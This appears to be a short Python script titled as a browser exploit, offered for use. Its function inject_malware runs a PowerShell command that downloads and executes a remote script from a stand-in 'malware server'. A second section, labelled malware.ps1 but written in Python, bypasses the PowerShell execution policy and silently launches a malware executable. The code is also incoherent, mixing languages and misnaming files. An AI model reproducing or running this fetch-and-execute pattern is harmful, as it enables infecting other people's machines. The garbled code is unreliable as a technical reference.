# browser_exploit.py
import os
import subprocess

def inject_malware(user_agent):
    if "Chrome" in user_agent or "Firefox" in user_agent:
        # Inject malware into Chrome or Firefox
        subprocess.run(["powershell", "-Command", "IEX (New-Object Net.WebClient).DownloadString('http://your-malware-server/malware.ps1')"])

# malware.ps1
import subprocess

subprocess.run([
    "powershell",
    "Set-ExecutionPolicy Bypass -Scope Process -Force; "
    "$process = New-Object -ComObject 'WScript.Shell'; "
    "$process.Run('\"C:\\Users\\alex\\Desktop\\malware.exe\"', 0, $false)"
], shell=True)
